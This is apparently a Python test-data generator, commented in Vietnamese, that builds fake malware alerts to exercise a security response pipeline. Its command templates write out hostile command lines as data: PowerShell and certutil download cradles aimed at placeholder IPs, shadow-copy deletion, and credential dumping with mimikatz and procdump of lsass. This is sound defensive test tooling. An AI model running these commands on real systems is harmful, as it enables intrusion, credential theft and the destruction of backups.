"""
alert_generator/generator.py
============================
Sinh alert malware giả lập đa dạng bằng Faker.

Mục đích:
  - Test pipeline với nhiều scenario khác nhau
  - Đảm bảo mỗi policy rule được test ít nhất 1 lần
  - Có thể sinh ra alert với "seeded" randomness để reproducible

Các loại alert có thể sinh:
  - MALICIOUS_HASH     : hash malicious → trigger isolate host
  - C2_COMMUNICATION   : IP C2 → trigger block IP
  - CRITICAL_ASSET     : host critical → trigger escalate
  - DANGEROUS_PROCESS  : process trong blacklist → trigger kill process
  - MIXED              : kết hợp nhiều trigger
  - BENIGN             : clean alert (test no-action path)
  - RANDOM             : hoàn toàn ngẫu nhiên
"""

import random
import uuid
from datetime import datetime
from typing import Optional

from faker import Faker

from schemas.alert import MalwareAlert, Severity

# Khởi tạo Faker với locale tiếng Anh để tên host/user trông thực tế
fake = Faker("en_US")


# ─────────────────────────────────────────────
# Dữ liệu mẫu để sinh alert đa dạng
# ─────────────────────────────────────────────

# Hash đã biết malicious (từ mock_hash_db.json)
KNOWN_MALICIOUS_HASHES = [
    "a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2",
    "deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef",
    "cafebabecafebabecafebabecafebabecafebabecafebabecafebabecafebabe",
]

# Hash đã biết suspicious
KNOWN_SUSPICIOUS_HASHES = [
    "f00dbabef00dbabef00dbabef00dbabef00dbabef00dbabef00dbabef00dbabe",
    "1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef",
]

# Hash clean
KNOWN_CLEAN_HASHES = [
    "0000000000000000000000000000000000000000000000000000000000000001",
    "0000000000000000000000000000000000000000000000000000000000000002",
]

# IP C2 đã biết (từ mock_ip_db.json)
KNOWN_C2_IPS = [
    "185.220.101.45",   # Tor exit node
    "194.165.16.11",    # RU - Ransomware C2
    "91.219.216.55",    # UA - Cobalt Strike C2
]

# IP clean
KNOWN_CLEAN_IPS = [
    "198.51.100.10",
    "203.0.113.5",
    "10.0.0.1",         # Internal
]

# Host critical (từ mock_asset_db.json)
KNOWN_CRITICAL_HOSTS = [
    "SRV-DC01",
    "SRV-FIN01",
    "SRV-DB01",
    "WS-FINANCE-01",
]

# Host normal/low
KNOWN_NORMAL_HOSTS = [
    "DESKTOP-ABC123",
    "DESKTOP-GUEST01",
    "WS-HR-01",
    "WS-DEV-01",
]

# Process nguy hiểm (từ dangerous_processes trong mitre_technique_map.json)
DANGEROUS_PROCESSES = [
    "mimikatz.exe",
    "wce.exe",
    "procdump.exe",
    "psexec.exe",
    "nc.exe",
    "beacon.exe",
]

# Process thông thường (ít đáng ngờ)
NORMAL_PROCESSES = [
    "powershell.exe",
    "cmd.exe",
    "wscript.exe",
    "mshta.exe",
    "regsvr32.exe",
]

# Parent processes phổ biến
PARENT_PROCESSES = [
    "winword.exe",      # Office macro execution
    "excel.exe",        # Office macro execution
    "explorer.exe",     # User initiated
    "svchost.exe",      # Service-based
    "wscript.exe",      # Script execution
    "mshta.exe",        # HTA execution
    "outlook.exe",      # Email-based
]

# Command line templates cho các technique
COMMAND_TEMPLATES = {
    "powershell_encoded": [
        "powershell.exe -nop -w hidden -enc {b64}",
        "powershell.exe -ExecutionPolicy Bypass -EncodedCommand {b64}",
        "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -enc {b64}",
    ],
    "powershell_iex": [
        "powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://{ip}/stage')",
        "powershell -nop -c \"IEX ((new-object net.webclient).downloadstring('http://{ip}/a'))\"",
    ],
    "certutil_download": [
        "certutil.exe -decode C:\\Users\\Public\\encoded.txt C:\\Users\\Public\\payload.exe",
        "certutil.exe -urlcache -split -f http://{ip}/malware.exe C:\\Temp\\update.exe",
    ],
    "shadow_delete": [
        "vssadmin delete shadows /all /quiet",
        "wmic shadowcopy delete /nointeractive",
    ],
    "service_creation": [
        "sc create SvcUpdater binPath= C:\\Windows\\Temp\\svchost32.exe start= auto",
    ],
    "credential_dump": [
        "mimikatz.exe privilege::debug sekurlsa::logonpasswords exit",
        "procdump.exe -accepteula -ma lsass.exe C:\\Temp\\lsass.dmp",
    ],
    "generic": [
        "{process} /S",
        "{process} --silent --no-gui",
        "C:\\Windows\\Temp\\{process}",
    ],
}

# Detection names theo loại malware
DETECTION_NAMES = {
    "ransomware": [
        "Ransomware.BlackCat.A", "Ransom.WannaCry", "Ransom.LockBit.2",
        "Ransomware.Ryuk", "Ransom.Conti"
    ],
    "backdoor": [
        "Backdoor.Cobalt.Strike.Beacon", "Backdoor.Metasploit.Meterpreter",
        "Backdoor.Empire.Agent", "Backdoor.Brute.Ratel"
    ],
    "trojan": [
        "Trojan.GenericKD.48756123", "Trojan.Banker.Zeus",
        "Trojan.Infostealer.RedLine", "Trojan.Stealer.Vidar"
    ],
    "tool": [
        "HackTool.Mimikatz", "HackTool.PSExec.Abuse",
        "Malware.Powershell.Encoded", "HackTool.NetCat"
    ],
    "generic": [
        "Suspicious.Behavior.Network", "Malware.Generic.Endpoint",
        "PUA.HackTool", "Suspicious.PowerShell.Execution"
    ]
}

FILE_PATHS = [
    "C:\\Users\\{user}\\AppData\\Local\\Temp\\{file}",
    "C:\\Windows\\Temp\\{file}",
    "C:\\ProgramData\\{file}",
    "C:\\Users\\{user}\\Downloads\\{file}",
    "C:\\Users\\Public\\{file}",
    "C:\\Windows\\System32\\{file}",
]

FAKE_B64 = "SGVsbG8gV29ybGQgLSBUaGlzIGlzIGEgbW9jayBlbmNvZGVkIGNvbW1hbmQ="


def _random_hash() -> str:
    """Sinh SHA256 hash ngẫu nhiên."""
    return fake.sha256()


def _random_ip() -> str:
    """Sinh IP ngẫu nhiên (không phải private)."""
    return fake.ipv4_public()


def _pick_random_detection() -> str:
    """Chọn ngẫu nhiên 1 detection name."""
    category = random.choice(list(DETECTION_NAMES.keys()))
    return random.choice(DETECTION_NAMES[category])


def _pick_random_command(process: str, ip: str = "1.2.3.4") -> str:
    """Sinh command line ngẫu nhiên theo process."""
    if "powershell" in process.lower():
        templates = (
            COMMAND_TEMPLATES["powershell_encoded"] +
            COMMAND_TEMPLATES["powershell_iex"]
        )
        template = random.choice(templates)
        return template.format(b64=FAKE_B64, ip=ip)
    elif process.lower() in ("mimikatz.exe", "procdump.exe"):
        return random.choice(COMMAND_TEMPLATES["credential_dump"])
    elif process.lower() == "certutil.exe":
        return random.choice(COMMAND_TEMPLATES["certutil_download"]).format(ip=ip)
    else:
        template = random.choice(COMMAND_TEMPLATES["generic"])
        return template.format(process=process)


def _pick_random_file_path(username: str, process: str) -> str:
    """Sinh đường dẫn file theo username và process name."""
    template = random.choice(FILE_PATHS)
    return template.format(user=username, file=process)


# ─────────────────────────────────────────────
# Public Generator Functions
# ─────────────────────────────────────────────

def generate_alert(
    scenario: str = "random",
    severity: Optional[str] = None,
    seed: Optional[int] = None
) -> MalwareAlert:
    """
    Sinh 1 alert malware theo scenario chỉ định.
    
    Args:
        scenario: Loại alert cần sinh:
            - "malicious_hash"    : hash nằm trong blacklist → isolate
            - "c2_communication"  : IP đích là C2 → block IP
            - "critical_asset"    : host critical + không clean → escalate
            - "dangerous_process" : process nguy hiểm → kill process
            - "mixed"             : nhiều trigger cùng lúc
            - "benign"            : clean alert → no action
            - "random"            : hoàn toàn ngẫu nhiên (mặc định)
        severity: Override mức severity (nếu None → tự động theo scenario)
        seed: Random seed để reproducible
        
    Returns:
        MalwareAlert đã validate bằng Pydantic
    """
    if seed is not None:
        random.seed(seed)
        Faker.seed(seed)

    # Sinh dữ liệu cơ bản
    alert_id = str(uuid.uuid4())
    username = fake.user_name()

    builders = {
        "malicious_hash": _build_malicious_hash_alert,
        "c2_communication": _build_c2_alert,
        "critical_asset": _build_critical_asset_alert,
        "dangerous_process": _build_dangerous_process_alert,
        "mixed": _build_mixed_alert,
        "benign": _build_benign_alert,
        "random": _build_random_alert,
    }

    builder = builders.get(scenario, _build_random_alert)
    params = builder(alert_id, username)

    # Override severity nếu được chỉ định
    if severity is not None:
        params["severity"] = Severity(severity)

    return MalwareAlert(**params)


def generate_batch(count: int = 10, seed: Optional[int] = None) -> list[MalwareAlert]:
    """
    Sinh nhiều alert cùng lúc với scenarios đa dạng.
    
    Args:
        count: Số lượng alert cần sinh
        seed : Random seed
        
    Returns:
        List các MalwareAlert
    """
    if seed is not None:
        random.seed(seed)
        Faker.seed(seed)

    scenarios = [
        "malicious_hash", "c2_communication", "critical_asset",
        "dangerous_process", "mixed", "benign", "random"
    ]

    alerts = []
    for i in range(count):
        # Xoay vòng qua các scenario để đảm bảo đa dạng
        scenario = scenarios[i % len(scenarios)]
        alerts.append(generate_alert(scenario=scenario))

    return alerts


# ─────────────────────────────────────────────
# Private Builder Functions (1 per scenario)
# ─────────────────────────────────────────────

def _build_malicious_hash_alert(alert_id: str, username: str) -> dict:
    """Hash malicious → policy sẽ trigger isolate_host."""
    hostname = random.choice(KNOWN_NORMAL_HOSTS)
    process = random.choice(NORMAL_PROCESSES)
    ip = random.choice(KNOWN_CLEAN_IPS)
    file_hash = random.choice(KNOWN_MALICIOUS_HASHES)

    return {
        "alert_id": alert_id,
        "hostname": hostname,
        "username": username,
        "process_name": process,
        "file_path": _pick_random_file_path(username, process),
        "file_hash": file_hash,
        "parent_process": random.choice(PARENT_PROCESSES),
        "command_line": _pick_random_command(process, ip),
        "destination_ip": ip,
        "severity": Severity.HIGH,
        "detection_name": random.choice(DETECTION_NAMES["trojan"]),
    }


def _build_c2_alert(alert_id: str, username: str) -> dict:
    """IP đích là C2 → policy sẽ trigger block_ip."""
    hostname = random.choice(KNOWN_NORMAL_HOSTS)
    process = random.choice(NORMAL_PROCESSES)
    ip = random.choice(KNOWN_C2_IPS)
    file_hash = random.choice(KNOWN_CLEAN_HASHES)

    return {
        "alert_id": alert_id,
        "hostname": hostname,
        "username": username,
        "process_name": process,
        "file_path": _pick_random_file_path(username, process),
        "file_hash": file_hash,
        "parent_process": random.choice(PARENT_PROCESSES),
        "command_line": _pick_random_command(process, ip),
        "destination_ip": ip,
        "severity": Severity.MEDIUM,
        "detection_name": random.choice(DETECTION_NAMES["backdoor"]),
    }


def _build_critical_asset_alert(alert_id: str, username: str) -> dict:
    """Host critical + alert → policy sẽ trigger escalate."""
    hostname = random.choice(KNOWN_CRITICAL_HOSTS)
    process = random.choice(NORMAL_PROCESSES)
    ip = random.choice(KNOWN_CLEAN_IPS)
    file_hash = random.choice(KNOWN_CLEAN_HASHES + KNOWN_SUSPICIOUS_HASHES)

    return {
        "alert_id": alert_id,
        "hostname": hostname,
        "username": username,
        "process_name": process,
        "file_path": _pick_random_file_path(username, process),
        "file_hash": file_hash,
        "parent_process": random.choice(PARENT_PROCESSES),
        "command_line": _pick_random_command(process, ip),
        "destination_ip": ip,
        "severity": Severity.MEDIUM,
        "detection_name": random.choice(DETECTION_NAMES["generic"]),
    }


def _build_dangerous_process_alert(alert_id: str, username: str) -> dict:
    """Process nguy hiểm → policy sẽ trigger kill_process."""
    hostname = random.choice(KNOWN_NORMAL_HOSTS)
    process = random.choice(DANGEROUS_PROCESSES)
    ip = random.choice(KNOWN_CLEAN_IPS)
    file_hash = _random_hash()  # Hash ngẫu nhiên, chưa biết

    return {
        "alert_id": alert_id,
        "hostname": hostname,
        "username": username,
        "process_name": process,
        "file_path": _pick_random_file_path(username, process),
        "file_hash": file_hash,
        "parent_process": random.choice(PARENT_PROCESSES),
        "command_line": _pick_random_command(process, ip),
        "destination_ip": ip,
        "severity": Severity.HIGH,
        "detection_name": random.choice(DETECTION_NAMES["tool"]),
    }


def _build_mixed_alert(alert_id: str, username: str) -> dict:
    """Kết hợp nhiều trigger → nhiều action được kích hoạt đồng thời."""
    hostname = random.choice(KNOWN_CRITICAL_HOSTS)  # Critical asset
    process = random.choice(DANGEROUS_PROCESSES)     # Dangerous process
    ip = random.choice(KNOWN_C2_IPS)                 # C2 IP
    file_hash = random.choice(KNOWN_MALICIOUS_HASHES)  # Malicious hash

    return {
        "alert_id": alert_id,
        "hostname": hostname,
        "username": username,
        "process_name": process,
        "file_path": _pick_random_file_path(username, process),
        "file_hash": file_hash,
        "parent_process": random.choice(PARENT_PROCESSES),
        "command_line": _pick_random_command(process, ip),
        "destination_ip": ip,
        "severity": Severity.CRITICAL,
        "detection_name": random.choice(DETECTION_NAMES["ransomware"]),
    }


def _build_benign_alert(alert_id: str, username: str) -> dict:
    """Alert với tất cả indicators sạch → no action hoặc chỉ create ticket."""
    hostname = random.choice(KNOWN_NORMAL_HOSTS)
    process = "powershell.exe"
    ip = random.choice(KNOWN_CLEAN_IPS)
    file_hash = random.choice(KNOWN_CLEAN_HASHES)

    return {
        "alert_id": alert_id,
        "hostname": hostname,
        "username": username,
        "process_name": process,
        "file_path": _pick_random_file_path(username, process),
        "file_hash": file_hash,
        "parent_process": "explorer.exe",
        "command_line": "powershell.exe -ExecutionPolicy RemoteSigned -File C:\\scripts\\backup.ps1",
        "destination_ip": ip,
        "severity": Severity.LOW,
        "detection_name": "Suspicious.Powershell.Execution",
    }


def _build_random_alert(alert_id: str, username: str) -> dict:
    """Hoàn toàn ngẫu nhiên — dùng để stress test pipeline."""
    process = random.choice(NORMAL_PROCESSES + DANGEROUS_PROCESSES)
    ip = random.choice(KNOWN_C2_IPS + KNOWN_CLEAN_IPS + [_random_ip()])
    file_hash = random.choice(
        KNOWN_MALICIOUS_HASHES + KNOWN_SUSPICIOUS_HASHES +
        KNOWN_CLEAN_HASHES + [_random_hash()]
    )
    hostname = random.choice(
        KNOWN_CRITICAL_HOSTS + KNOWN_NORMAL_HOSTS +
        [f"DESKTOP-{fake.lexify('??????').upper()}"]
    )

    return {
        "alert_id": alert_id,
        "hostname": hostname,
        "username": username,
        "process_name": process,
        "file_path": _pick_random_file_path(username, process),
        "file_hash": file_hash,
        "parent_process": random.choice(PARENT_PROCESSES),
        "command_line": _pick_random_command(process, ip),
        "destination_ip": ip,
        "severity": random.choice(list(Severity)),
        "detection_name": _pick_random_detection(),
    }
